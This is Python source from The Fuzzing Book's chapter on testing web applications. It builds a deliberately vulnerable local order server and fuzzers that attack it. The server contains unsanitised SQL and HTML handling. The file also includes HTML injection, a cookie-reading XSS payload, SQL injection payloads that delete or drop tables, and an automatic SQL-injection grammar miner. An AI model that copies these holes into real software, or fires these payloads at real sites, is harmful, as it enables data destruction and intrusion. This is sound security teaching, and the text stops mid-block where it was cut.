#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# "Testing Web Applications" - a chapter of "The Fuzzing Book"
# Web site: https://www.fuzzingbook.org/html/WebFuzzer.html
# Last change: 2021-06-04 16:11:46+02:00
#
# Copyright (c) 2021 CISPA Helmholtz Center for Information Security
# Copyright (c) 2018-2020 Saarland University, authors, and contributors
#
# Permission is hereby granted, free of charge, to any person obtaining a
# copy of this software and associated documentation files (the
# "Software"), to deal in the Software without restriction, including
# without limitation the rights to use, copy, modify, merge, publish,
# distribute, sublicense, and/or sell copies of the Software, and to
# permit persons to whom the Software is furnished to do so, subject to
# the following conditions:
#
# The above copyright notice and this permission notice shall be included
# in all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS
# OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
# MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
# IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY
# CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
# TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
# SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

r'''
The Fuzzing Book - Testing Web Applications

This file can be _executed_ as a script, running all experiments:

    $ python WebFuzzer.py

or _imported_ as a package, providing classes, functions, and constants:

    >>> from fuzzingbook.WebFuzzer import <identifier>
    
but before you do so, _read_ it and _interact_ with it at:

    https://www.fuzzingbook.org/html/WebFuzzer.html

This chapter provides a simple (and vulnerable) Web server and two experimental fuzzers that are applied to it.

### Fuzzing Web Forms

`WebFormFuzzer` demonstrates how to interact with a Web form.  Given a URL with a Web form, it automatically extracts a grammar that produces a URL; this URL contains values for all form elements.  Support is limited to GET forms and a subset of HTML form elements.

Here's the grammar extracted for our vulnerable Web server:

>>> web_form_fuzzer = WebFormFuzzer(httpd_url)
>>> web_form_fuzzer.grammar['']
['?']
>>> web_form_fuzzer.grammar['']
['/order']
>>> web_form_fuzzer.grammar['']
['&&&&&&']

Using it for fuzzing yields a path with all form values filled; accessing this path acts like filling out and submitting the form.

>>> web_form_fuzzer.fuzz()
'/order?item=lockset&name=%43+&email=+c%40_+c&city=%37b_4&zip=5&terms=on&submit='

Repeated calls to `WebFormFuzzer.fuzz()` invoke the form again and again, each time with different (fuzzed) values.

### SQL Injection Attacks

`SQLInjectionFuzzer` is an experimental extension of `WebFormFuzzer` whose constructor takes an additional _payload_ – an SQL command to be injected and executed on the server.  Otherwise, it is used like `WebFormFuzzer`:

>>> sql_fuzzer = SQLInjectionFuzzer(httpd_url, "DELETE FROM orders")
>>> sql_fuzzer.fuzz()
"/order?item=lockset&name=+&email=0%404&city=+'+)%3b+DELETE+FROM+orders%3b+--&zip='+OR+1%3d1--'&terms=on&submit="

As you can see, the path to be retrieved contains the payload encoded into one of the form field values.

`SQLInjectionFuzzer` is a proof-of-concept on how to build a malicious fuzzer; you should study and extend its code to make actual use of it.


For more details, source, and documentation, see
"The Fuzzing Book - Testing Web Applications"
at https://www.fuzzingbook.org/html/WebFuzzer.html
'''


# Allow to use 'from . import <module>' when run as script (cf. PEP 366)
if __name__ == '__main__' and __package__ is None:
    __package__ = 'fuzzingbook'


# Testing Web Applications
# ========================

if __name__ == '__main__':
    print('# Testing Web Applications')



## Synopsis
## --------

if __name__ == '__main__':
    print('\n## Synopsis')



## A Web User Interface
## --------------------

if __name__ == '__main__':
    print('\n## A Web User Interface')



from http.server import HTTPServer, BaseHTTPRequestHandler, HTTPStatus

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    pass

### Taking Orders

if __name__ == '__main__':
    print('\n### Taking Orders')



if __name__ == '__main__':
    # We use the same fixed seed as the notebook to ensure consistency
    import random
    random.seed(2001)

FUZZINGBOOK_SWAG = {
    "tshirt": "One FuzzingBook T-Shirt",
    "drill": "One FuzzingBook Rotary Hammer",
    "lockset": "One FuzzingBook Lock Set"
}

HTML_ORDER_FORM = """
<html><body>
<form action="/order" style="border:3px; border-style:solid; border-color:#FF0000; padding: 1em;">
  <strong id="title" style="font-size: x-large">Fuzzingbook Swag Order Form</strong>
  <p>
  Yes! Please send me at your earliest convenience
  <select name="item">
  """
# (We don't use h2, h3, etc. here as they interfere with the notebook table of contents)


for item in FUZZINGBOOK_SWAG:
    HTML_ORDER_FORM += \
        '<option value="{item}">{name}</option>\n'.format(item=item,
            name=FUZZINGBOOK_SWAG[item])

HTML_ORDER_FORM += """
  </select>
  <br>
  <table>
  <tr><td>
  <label for="name">Name: </label><input type="text" name="name">
  </td><td>
  <label for="email">Email: </label><input type="email" name="email"><br>
  </td></tr>
  <tr><td>
  <label for="city">City: </label><input type="text" name="city">
  </td><td>
  <label for="zip">ZIP Code: </label><input type="number" name="zip">
  </tr></tr>
  </table>
  <input type="checkbox" name="terms"><label for="terms">I have read
  the <a href="/terms">terms and conditions</a></label>.<br>
  <input type="submit" name="submit" value="Place order">
</p>
</form>
</body></html>
"""

if __name__ == '__main__':
    from IPython.display import display

from .bookutils import HTML

if __name__ == '__main__':
    HTML(HTML_ORDER_FORM)

### Order Confirmation

if __name__ == '__main__':
    print('\n### Order Confirmation')



HTML_ORDER_RECEIVED = """
<html><body>
<div style="border:3px; border-style:solid; border-color:#FF0000; padding: 1em;">
  <strong id="title" style="font-size: x-large">Thank you for your Fuzzingbook Order!</strong>
  <p id="confirmation">
  We will send <strong>{item_name}</strong> to {name} in {city}, {zip}<br>
  A confirmation mail will be sent to {email}.
  </p>
  <p>
  Want more swag?  Use our <a href="/">order form</a>!
  </p>
</div>
</body></html>
"""

if __name__ == '__main__':
    HTML(HTML_ORDER_RECEIVED.format(item_name="One FuzzingBook Rotary Hammer",
                                    name="Jane Doe",
                                    email="doe@example.com",
                                    city="Seattle",
                                    zip="98104"))

### Terms and Conditions

if __name__ == '__main__':
    print('\n### Terms and Conditions')



HTML_TERMS_AND_CONDITIONS = """
<html><body>
<div style="border:3px; border-style:solid; border-color:#FF0000; padding: 1em;">
  <strong id="title" style="font-size: x-large">Fuzzingbook Terms and Conditions</strong>
  <p>
  The content of this project is licensed under the
  <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">Creative Commons
  Attribution-NonCommercial-ShareAlike 4.0 International License.</a>
  </p>
  <p>
  To place an order, use our <a href="/">order form</a>.
  </p>
</div>
</body></html>
"""

if __name__ == '__main__':
    HTML(HTML_TERMS_AND_CONDITIONS)

## Storing Orders
## --------------

if __name__ == '__main__':
    print('\n## Storing Orders')



import sqlite3
import os

ORDERS_DB = "orders.db"

def init_db():
    if os.path.exists(ORDERS_DB):
        os.remove(ORDERS_DB)

    db_connection = sqlite3.connect(ORDERS_DB)
    db_connection.execute("DROP TABLE IF EXISTS orders")
    db_connection.execute("CREATE TABLE orders (item text, name text, email text, city text, zip text)")
    db_connection.commit()

    return db_connection

if __name__ == '__main__':
    db = init_db()

if __name__ == '__main__':
    print(db.execute("SELECT * FROM orders").fetchall())

if __name__ == '__main__':
    db.execute("INSERT INTO orders " +
               "VALUES ('lockset', 'Walter White', 'white@jpwynne.edu', 'Albuquerque', '87101')")
    db.commit()

if __name__ == '__main__':
    print(db.execute("SELECT * FROM orders").fetchall())

if __name__ == '__main__':
    db.execute("DELETE FROM orders WHERE name = 'Walter White'")
    db.commit()

if __name__ == '__main__':
    print(db.execute("SELECT * FROM orders").fetchall())

### Handling HTTP Requests

if __name__ == '__main__':
    print('\n### Handling HTTP Requests')



class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            # print("GET " + self.path)
            if self.path == "/":
                self.send_order_form()
            elif self.path.startswith("/order"):
                self.handle_order()
            elif self.path.startswith("/terms"):
                self.send_terms_and_conditions()
            else:
                self.not_found()
        except Exception:
            self.internal_server_error()

#### Order Form

if __name__ == '__main__':
    print('\n#### Order Form')



class SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):
    def send_order_form(self):
        self.send_response(HTTPStatus.OK, "Place your order")
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(HTML_ORDER_FORM.encode("utf8"))

class SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):
    def send_terms_and_conditions(self):
        self.send_response(HTTPStatus.OK, "Terms and Conditions")
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(HTML_TERMS_AND_CONDITIONS.encode("utf8"))

#### Processing Orders

if __name__ == '__main__':
    print('\n#### Processing Orders')



import urllib.parse

class SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):
    def get_field_values(self):
        # Note: this fails to decode non-ASCII characters properly
        query_string = urllib.parse.urlparse(self.path).query

        # fields is { 'item': ['tshirt'], 'name': ['Jane Doe'], ...}
        fields = urllib.parse.parse_qs(query_string, keep_blank_values=True)

        values = {}
        for key in fields:
            values[key] = fields[key][0]

        return values

class SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):
    def handle_order(self):
        values = self.get_field_values()
        self.store_order(values)
        self.send_order_received(values)

class SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):
    def store_order(self, values):
        db = sqlite3.connect(ORDERS_DB)
        # The following should be one line
        sql_command = "INSERT INTO orders VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')".format(**values)
        self.log_message("%s", sql_command)
        db.executescript(sql_command)
        db.commit()

class SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):
    def send_order_received(self, values):
        # Should use html.escape()
        values["item_name"] = FUZZINGBOOK_SWAG[values["item"]]
        confirmation = HTML_ORDER_RECEIVED.format(**values).encode("utf8")

        self.send_response(HTTPStatus.OK, "Order received")
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(confirmation)

#### Other HTTP commands

if __name__ == '__main__':
    print('\n#### Other HTTP commands')



class SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):
    def do_HEAD(self):
        # print("HEAD " + self.path)
        self.send_response(HTTPStatus.OK)
        self.send_header("Content-type", "text/html")
        self.end_headers()

### Error Handling

if __name__ == '__main__':
    print('\n### Error Handling')



#### Page Not Found

if __name__ == '__main__':
    print('\n#### Page Not Found')



HTML_NOT_FOUND = """
<html><body>
<div style="border:3px; border-style:solid; border-color:#FF0000; padding: 1em;">
  <strong id="title" style="font-size: x-large">Sorry.</strong>
  <p>
  This page does not exist.  Try our <a href="/">order form</a> instead.
  </p>
</div>
</body></html>
  """

if __name__ == '__main__':
    HTML(HTML_NOT_FOUND)

class SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):
    def not_found(self):
        self.send_response(HTTPStatus.NOT_FOUND, "Not found")

        self.send_header("Content-type", "text/html")
        self.end_headers()

        message = HTML_NOT_FOUND
        self.wfile.write(message.encode("utf8"))

#### Internal Errors

if __name__ == '__main__':
    print('\n#### Internal Errors')



HTML_INTERNAL_SERVER_ERROR = """
<html><body>
<div style="border:3px; border-style:solid; border-color:#FF0000; padding: 1em;">
  <strong id="title" style="font-size: x-large">Internal Server Error</strong>
  <p>
  The server has encountered an internal error.  Go to our <a href="/">order form</a>.
  <pre>{error_message}</pre>
  </p>
</div>
</body></html>
  """

if __name__ == '__main__':
    HTML(HTML_INTERNAL_SERVER_ERROR)

import sys
import traceback

class SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):
    def internal_server_error(self):
        self.send_response(HTTPStatus.INTERNAL_SERVER_ERROR, "Internal Error")

        self.send_header("Content-type", "text/html")
        self.end_headers()

        exc = traceback.format_exc()
        self.log_message("%s", exc.strip())

        message = HTML_INTERNAL_SERVER_ERROR.format(error_message=exc)
        self.wfile.write(message.encode("utf8"))

### Logging

if __name__ == '__main__':
    print('\n### Logging')



from multiprocessing import Queue

HTTPD_MESSAGE_QUEUE = Queue()

HTTPD_MESSAGE_QUEUE.put("I am another message")

HTTPD_MESSAGE_QUEUE.put("I am one more message")

from .bookutils import rich_output, terminal_escape

def display_httpd_message(message):
    if rich_output():
        display(
            HTML(
                '<pre style="background: NavajoWhite;">' +
                message +
                "</pre>"))
    else:
        print(terminal_escape(message))

if __name__ == '__main__':
    display_httpd_message("I am a httpd server message")

def print_httpd_messages():
    while not HTTPD_MESSAGE_QUEUE.empty():
        message = HTTPD_MESSAGE_QUEUE.get()
        display_httpd_message(message)

import time

if __name__ == '__main__':
    time.sleep(1)
    print_httpd_messages()

def clear_httpd_messages():
    while not HTTPD_MESSAGE_QUEUE.empty():
        HTTPD_MESSAGE_QUEUE.get()

class SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        message = ("%s - - [%s] %s\n" %
                   (self.address_string(),
                    self.log_date_time_string(),
                    format % args))
        HTTPD_MESSAGE_QUEUE.put(message)

if __name__ == '__main__':
    import requests

def webbrowser(url, mute=False):
    """Download the http/https resource given by the URL"""
    import requests  # for imports
    
    try:
        r = requests.get(url)
        contents = r.text
    finally:
        if not mute:
            print_httpd_messages()
        else:
            clear_httpd_messages()

    return contents

### Running the Server

if __name__ == '__main__':
    print('\n### Running the Server')



def run_httpd_forever(handler_class):
    host = "127.0.0.1"  # localhost IP
    for port in range(8800, 9000):
        httpd_address = (host, port)

        try:
            httpd = HTTPServer(httpd_address, handler_class)
            break
        except OSError:
            continue

    httpd_url = "http://" + host + ":" + repr(port)
    HTTPD_MESSAGE_QUEUE.put(httpd_url)
    httpd.serve_forever()

from multiprocessing import Process

def start_httpd(handler_class=SimpleHTTPRequestHandler):
    clear_httpd_messages()

    httpd_process = Process(target=run_httpd_forever, args=(handler_class,))
    httpd_process.start()

    httpd_url = HTTPD_MESSAGE_QUEUE.get()
    return httpd_process, httpd_url

if __name__ == '__main__':
    httpd_process, httpd_url = start_httpd()
    httpd_url

### Interacting with the Server

if __name__ == '__main__':
    print('\n### Interacting with the Server')



#### Direct Browser Access

if __name__ == '__main__':
    print('\n#### Direct Browser Access')



def print_url(url):
    if rich_output():
        display(HTML('<pre><a href="%s">%s</a></pre>' % (url, url)))
    else:
        print(terminal_escape(url))

if __name__ == '__main__':
    print_url(httpd_url)

if __name__ == '__main__':
    from IPython.display import IFrame

if __name__ == '__main__':
    IFrame(httpd_url, '100%', 230)

if __name__ == '__main__':
    print_httpd_messages()

if __name__ == '__main__':
    print(db.execute("SELECT * FROM orders").fetchall())

if __name__ == '__main__':
    db.execute("DELETE FROM orders")
    db.commit()

#### Retrieving the Home Page

if __name__ == '__main__':
    print('\n#### Retrieving the Home Page')



if __name__ == '__main__':
    contents = webbrowser(httpd_url)

if __name__ == '__main__':
    HTML(contents)

#### Placing Orders

if __name__ == '__main__':
    print('\n#### Placing Orders')



from urllib.parse import urljoin, urlsplit

if __name__ == '__main__':
    urljoin(httpd_url, "/order?foo=bar")

if __name__ == '__main__':
    contents = webbrowser(urljoin(httpd_url,
                                  "/order?item=tshirt&name=Jane+Doe&email=doe%40example.com&city=Seattle&zip=98104"))

if __name__ == '__main__':
    HTML(contents)

if __name__ == '__main__':
    print(db.execute("SELECT * FROM orders").fetchall())

#### Error Messages

if __name__ == '__main__':
    print('\n#### Error Messages')



if __name__ == '__main__':
    HTML(webbrowser(urljoin(httpd_url, "/some/other/path")))

## Fuzzing Input Forms
## -------------------

if __name__ == '__main__':
    print('\n## Fuzzing Input Forms')



### Fuzzing with Expected Values

if __name__ == '__main__':
    print('\n### Fuzzing with Expected Values')



import string

def cgi_encode(s, do_not_encode=""):
    ret = ""
    for c in s:
        if (c in string.ascii_letters or c in string.digits
                or c in "$-_.+!*'()," or c in do_not_encode):
            ret += c
        elif c == ' ':
            ret += '+'
        else:
            ret += "%%%02x" % ord(c)
    return ret

if __name__ == '__main__':
    s = cgi_encode('Is "DOW30" down .24%?')
    s

if __name__ == '__main__':
    cgi_encode("<string>@<string>", "<>")

from .Coverage import cgi_decode  # minor dependency

if __name__ == '__main__':
    cgi_decode(s)

from .Grammars import crange, is_valid_grammar, syntax_diagram

ORDER_GRAMMAR = {
    "<start>": ["<order>"],
    "<order>": ["/order?item=<item>&name=<name>&email=<email>&city=<city>&zip=<zip>"],
    "<item>": ["tshirt", "drill", "lockset"],
    "<name>": [cgi_encode("Jane Doe"), cgi_encode("John Smith")],
    "<email>": [cgi_encode("j.doe@example.com"), cgi_encode("j_smith@example.com")],
    "<city>": ["Seattle", cgi_encode("New York")],
    "<zip>": ["<digit>" * 5],
    "<digit>": crange('0', '9')
}

if __name__ == '__main__':
    assert is_valid_grammar(ORDER_GRAMMAR)

if __name__ == '__main__':
    syntax_diagram(ORDER_GRAMMAR)

from .GrammarFuzzer import GrammarFuzzer

if __name__ == '__main__':
    order_fuzzer = GrammarFuzzer(ORDER_GRAMMAR)
    [order_fuzzer.fuzz() for i in range(5)]

if __name__ == '__main__':
    HTML(webbrowser(urljoin(httpd_url, order_fuzzer.fuzz())))

if __name__ == '__main__':
    print(db.execute("SELECT * FROM orders").fetchall())

### Fuzzing with Unexpected Values

if __name__ == '__main__':
    print('\n### Fuzzing with Unexpected Values')



if __name__ == '__main__':
    seed = order_fuzzer.fuzz()
    seed

from .MutationFuzzer import MutationFuzzer  # minor deoendency

if __name__ == '__main__':
    mutate_order_fuzzer = MutationFuzzer([seed], min_mutations=1, max_mutations=1)
    [mutate_order_fuzzer.fuzz() for i in range(5)]

if __name__ == '__main__':
    while True:
        path = mutate_order_fuzzer.fuzz()
        url = urljoin(httpd_url, path)
        r = requests.get(url)
        if r.status_code == HTTPStatus.INTERNAL_SERVER_ERROR:
            break

if __name__ == '__main__':
    url

if __name__ == '__main__':
    clear_httpd_messages()
    HTML(webbrowser(url))

if __name__ == '__main__':
    failing_path = path
    failing_path

from .Fuzzer import Runner

class WebRunner(Runner):
    def __init__(self, base_url=None):
        self.base_url = base_url

    def run(self, url):
        if self.base_url is not None:
            url = urljoin(self.base_url, url)

        import requests  # for imports
        r = requests.get(url)
        if r.status_code == HTTPStatus.OK:
            return url, Runner.PASS
        elif r.status_code == HTTPStatus.INTERNAL_SERVER_ERROR:
            return url, Runner.FAIL
        else:
            return url, Runner.UNRESOLVED

if __name__ == '__main__':
    web_runner = WebRunner(httpd_url)
    web_runner.run(failing_path)

from .Reducer import DeltaDebuggingReducer  # minor

if __name__ == '__main__':
    minimized_path = DeltaDebuggingReducer(web_runner).reduce(failing_path)
    minimized_path

if __name__ == '__main__':
    minimized_url = urljoin(httpd_url, minimized_path)
    minimized_url

if __name__ == '__main__':
    clear_httpd_messages()
    HTML(webbrowser(minimized_url))

## Extracting Grammars for Input Forms
## -----------------------------------

if __name__ == '__main__':
    print('\n## Extracting Grammars for Input Forms')



### Searching HTML for Input Fields

if __name__ == '__main__':
    print('\n### Searching HTML for Input Fields')



if __name__ == '__main__':
    html_text = webbrowser(httpd_url)
    print(html_text[html_text.find("<form"):html_text.find("</form>") + len("</form>")])

from html.parser import HTMLParser

class FormHTMLParser(HTMLParser):
    def reset(self):
        super().reset()
        self.action = ""  # Form action
        # Map of field name to type (or selection name to [option_1, option_2,
        # ...])
        self.fields = {}
        self.select = []  # Stack of currently active selection names

class FormHTMLParser(FormHTMLParser):
    def handle_starttag(self, tag, attrs):
        attributes = {attr_name: attr_value for attr_name, attr_value in attrs}
        # print(tag, attributes)

        if tag == "form":
            self.action = attributes.get("action", "")

        elif tag == "select" or tag == "datalist":
            if "name" in attributes:
                name = attributes["name"]
                self.fields[name] = []
                self.select.append(name)
            else:
                self.select.append(None)

        elif tag == "option" and "multiple" not in attributes:
            current_select_name = self.select[-1]
            if current_select_name is not None and "value" in attributes:
                self.fields[current_select_name].append(attributes["value"])

        elif tag == "input" or tag == "option" or tag == "textarea":
            if "name" in attributes:
                name = attributes["name"]
                self.fields[name] = attributes.get("type", "text")

        elif tag == "button":
            if "name" in attributes:
                name = attributes["name"]
                self.fields[name] = [""]

class FormHTMLParser(FormHTMLParser):
    def handle_endtag(self, tag):
        if tag == "select":
            self.select.pop()

class HTMLGrammarMiner(object):
    def __init__(self, html_text):
        html_parser = FormHTMLParser()
        html_parser.feed(html_text)
        self.fields = html_parser.fields
        self.action = html_parser.action

if __name__ == '__main__':
    html_miner = HTMLGrammarMiner(html_text)
    html_miner.action

if __name__ == '__main__':
    html_miner.fields

### Mining Grammars for Web Pages

if __name__ == '__main__':
    print('\n### Mining Grammars for Web Pages')



from .Grammars import crange, srange, new_symbol, unreachable_nonterminals, CGI_GRAMMAR, extend_grammar

class HTMLGrammarMiner(HTMLGrammarMiner):
    QUERY_GRAMMAR = extend_grammar(CGI_GRAMMAR, {
        "<start>": ["<action>?<query>"],

        "<text>": ["<string>"],

        "<number>": ["<digits>"],
        "<digits>": ["<digit>", "<digits><digit>"],
        "<digit>": crange('0', '9'),

        "<checkbox>": ["<_checkbox>"],
        "<_checkbox>": ["on", "off"],

        "<email>": ["<_email>"],
        "<_email>": [cgi_encode("<string>@<string>", "<>")],

        # Use a fixed password in case we need to repeat it
        "<password>": ["<_password>"],
        "<_password>": ["abcABC.123"],

        # Stick to printable characters to avoid logging problems
        "<percent>": ["%<hexdigit-1><hexdigit>"],
        "<hexdigit-1>": srange("34567"),
        
        # Submissions:
        "<submit>": [""]
    })

class HTMLGrammarMiner(HTMLGrammarMiner):
    def mine_grammar(self):
        grammar = extend_grammar(self.QUERY_GRAMMAR)
        grammar["<action>"] = [self.action]

        query = ""
        for field in self.fields:
            field_symbol = new_symbol(grammar, "<" + field + ">")
            field_type = self.fields[field]

            if query != "":
                query += "&"
            query += field_symbol

            if isinstance(field_type, str):
                field_type_symbol = "<" + field_type + ">"
                grammar[field_symbol] = [field + "=" + field_type_symbol]
                if field_type_symbol not in grammar:
                    # Unknown type
                    grammar[field_type_symbol] = ["<text>"]
            else:
                # List of values
                value_symbol = new_symbol(grammar, "<" + field + "-value>")
                grammar[field_symbol] = [field + "=" + value_symbol]
                grammar[value_symbol] = field_type

        grammar["<query>"] = [query]

        # Remove unused parts
        for nonterminal in unreachable_nonterminals(grammar):
            del grammar[nonterminal]

        assert is_valid_grammar(grammar)

        return grammar

if __name__ == '__main__':
    html_miner = HTMLGrammarMiner(html_text)
    grammar = html_miner.mine_grammar()
    grammar

if __name__ == '__main__':
    grammar["<start>"]

if __name__ == '__main__':
    grammar["<action>"]

if __name__ == '__main__':
    grammar["<query>"]

if __name__ == '__main__':
    grammar["<zip>"]

if __name__ == '__main__':
    grammar["<terms>"]

if __name__ == '__main__':
    order_fuzzer = GrammarFuzzer(grammar)
    [order_fuzzer.fuzz() for i in range(3)]

if __name__ == '__main__':
    HTML(webbrowser(urljoin(httpd_url, order_fuzzer.fuzz())))

### A Fuzzer for Web Forms

if __name__ == '__main__':
    print('\n### A Fuzzer for Web Forms')



class WebFormFuzzer(GrammarFuzzer):
    def __init__(self, url, **grammar_fuzzer_options):
        html_text = self.get_html(url)
        grammar = self.get_grammar(html_text)
        super().__init__(grammar, **grammar_fuzzer_options)

    def get_html(self, url):
        return requests.get(url).text

    def get_grammar(self, html_text):
        grammar_miner = HTMLGrammarMiner(html_text)
        return grammar_miner.mine_grammar()        

if __name__ == '__main__':
    web_form_fuzzer = WebFormFuzzer(httpd_url)
    web_form_fuzzer.fuzz()

if __name__ == '__main__':
    web_form_runner = WebRunner(httpd_url)
    web_form_fuzzer.runs(web_form_runner, 10)

if __name__ == '__main__':
    clear_httpd_messages()

## Crawling User Interfaces
## ------------------------

if __name__ == '__main__':
    print('\n## Crawling User Interfaces')



class LinkHTMLParser(HTMLParser):
    def reset(self):
        super().reset()
        self.links = []

    def handle_starttag(self, tag, attrs):
        attributes = {attr_name: attr_value for attr_name, attr_value in attrs}

        if tag == "a" and "href" in attributes:
            # print("Found:", tag, attributes)
            self.links.append(attributes["href"])

from collections import deque
import urllib.robotparser

def crawl(url, max_pages=1, same_host=True):
    """Return the list of linked URLs from the given URL.  Accesses up to `max_pages`."""

    pages = deque([(url, "<param>")])
    urls_seen = set()

    rp = urllib.robotparser.RobotFileParser()
    rp.set_url(urljoin(url, "/robots.txt"))
    rp.read()

    while len(pages) > 0 and max_pages > 0:
        page, referrer = pages.popleft()
        if not rp.can_fetch("*", page):
            # Disallowed by robots.txt
            continue

        r = requests.get(page)
        max_pages -= 1

        if r.status_code != HTTPStatus.OK:
            print("Error " + repr(r.status_code) + ": " + page,
                  "(referenced from " + referrer + ")",
                  file=sys.stderr)
            continue

        content_type = r.headers["content-type"]
        if not content_type.startswith("text/html"):
            continue

        parser = LinkHTMLParser()
        parser.feed(r.text)

        for link in parser.links:
            target_url = urljoin(page, link)
            if same_host and urlsplit(
                    target_url).hostname != urlsplit(url).hostname:
                # Different host
                continue
            if urlsplit(target_url).fragment != "":
                # Ignore #fragments
                continue

            if target_url not in urls_seen:
                pages.append((target_url, page))
                urls_seen.add(target_url)
                yield target_url

        if page not in urls_seen:
            urls_seen.add(page)
            yield page

if __name__ == '__main__':
    for url in crawl(httpd_url):
        print_httpd_messages()
        print_url(url)

if __name__ == '__main__':
    for url in crawl("https://www.fuzzingbook.org/"):
        print_url(url)

if __name__ == '__main__':
    for url in crawl(httpd_url, max_pages=float('inf')):
        web_form_fuzzer = WebFormFuzzer(url)
        web_form_runner = WebRunner(url)
        print(web_form_fuzzer.run(web_form_runner))

if __name__ == '__main__':
    clear_httpd_messages()

## Crafting Web Attacks
## --------------------

if __name__ == '__main__':
    print('\n## Crafting Web Attacks')



### HTML Injection Attacks

if __name__ == '__main__':
    print('\n### HTML Injection Attacks')



from .Grammars import extend_grammar

ORDER_GRAMMAR_WITH_HTML_INJECTION = extend_grammar(ORDER_GRAMMAR, {
    "<name>": [cgi_encode('''
    Jane Doe<p>
    <strong><a href="www.lots.of.malware">Click here for cute cat pictures!</a></strong>
    </p>
    ''')],
})

if __name__ == '__main__':
    html_injection_fuzzer = GrammarFuzzer(ORDER_GRAMMAR_WITH_HTML_INJECTION)
    order_with_injected_html = html_injection_fuzzer.fuzz()
    order_with_injected_html

if __name__ == '__main__':
    HTML(webbrowser(urljoin(httpd_url, order_with_injected_html)))

if __name__ == '__main__':
    print(db.execute("SELECT * FROM orders WHERE name LIKE '%<%'").fetchall())

### Cross-Site Scripting Attacks

if __name__ == '__main__':
    print('\n### Cross-Site Scripting Attacks')



ORDER_GRAMMAR_WITH_XSS_INJECTION = extend_grammar(ORDER_GRAMMAR, {
    "<name>": [cgi_encode('Jane Doe' +
                          '<script>' +
                          'document.title = document.cookie.substring(0, 10);' +
                          '</script>')
               ],
})

if __name__ == '__main__':
    xss_injection_fuzzer = GrammarFuzzer(ORDER_GRAMMAR_WITH_XSS_INJECTION)
    order_with_injected_xss = xss_injection_fuzzer.fuzz()
    order_with_injected_xss

if __name__ == '__main__':
    url_with_injected_xss = urljoin(httpd_url, order_with_injected_xss)
    url_with_injected_xss

if __name__ == '__main__':
    HTML(webbrowser(url_with_injected_xss, mute=True))

if __name__ == '__main__':
    HTML('<script>document.title = "Jupyter"</script>')

### SQL Injection Attacks

if __name__ == '__main__':
    print('\n### SQL Injection Attacks')



if __name__ == '__main__':
    values = {
        "item": "tshirt",
        "name": "Jane Doe",
        "email": "j.doe@example.com",
        "city": "Seattle",
        "zip": "98104"
    }

if __name__ == '__main__':
    sql_command = ("INSERT INTO orders " +
                   "VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')".format(**values))
    sql_command

if __name__ == '__main__':
    values["name"] = "Jane', 'x', 'x', 'x'); DELETE FROM orders; -- "

if __name__ == '__main__':
    sql_command = ("INSERT INTO orders " +
                   "VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')".format(**values))
    sql_command

from .Grammars import extend_grammar

ORDER_GRAMMAR_WITH_SQL_INJECTION = extend_grammar(ORDER_GRAMMAR, {
    "<name>": [cgi_encode("Jane', 'x', 'x', 'x'); DELETE FROM orders; --")],
})

if __name__ == '__main__':
    sql_injection_fuzzer = GrammarFuzzer(ORDER_GRAMMAR_WITH_SQL_INJECTION)
    order_with_injected_sql = sql_injection_fuzzer.fuzz()
    order_with_injected_sql

if __name__ == '__main__':
    print(db.execute("SELECT * FROM orders").fetchall())

if __name__ == '__main__':
    contents = webbrowser(urljoin(httpd_url, order_with_injected_sql))

if __name__ == '__main__':
    print(db.execute("SELECT * FROM orders").fetchall())

### Leaking Internal Information

if __name__ == '__main__':
    print('\n### Leaking Internal Information')



if __name__ == '__main__':
    answer = webbrowser(urljoin(httpd_url, "/order"), mute=True)

if __name__ == '__main__':
    HTML(answer)

## Fully Automatic Web Attacks
## ---------------------------

if __name__ == '__main__':
    print('\n## Fully Automatic Web Attacks')



class SQLInjectionGrammarMiner(HTMLGrammarMiner):
    ATTACKS = [
        "<string>' <sql-values>); <sql-payload>; <sql-comment>",
        "<string>' <sql-comment>",
        "' OR 1=1<sql-comment>'",
        "<number> OR 1=1",
    ]

    def __init__(self, html_text, sql_payload):
        super().__init__(html_text)

        self.QUERY_GRAMMAR = extend_grammar(self.QUERY_GRAMMAR, {
            "<text>": ["<string>", "<sql-injection-attack>"],
            "<number>": ["<digits>", "<sql-injection-attack>"],
            "<checkbox>": ["<_checkbox>", "<sql-injection-attack>"],
            "<email>": ["<_email>", "<sql-injection-attack>"],
            "<sql-injection-attack>": [
                cgi_encode(attack, "<->") for attack in self.ATTACKS
            ],
            "<sql-values>": ["", cgi_encode("<sql-values>, '<string>'", "<->")],
            "<sql-payload>": [cgi_encode(sql_payload)],
            "<sql-comment>": ["--", "#"],
        })

if __name__ == '__main__':
    html_miner = SQLInjectionGrammarMiner(
        html_text, sql_payload="DROP TABLE orders")

if __name__ == '__main__':
    grammar = html_miner.mine_grammar()
    grammar

if __name__ == '__main__':
    grammar["<text>"]

if __name__ == '__main__':
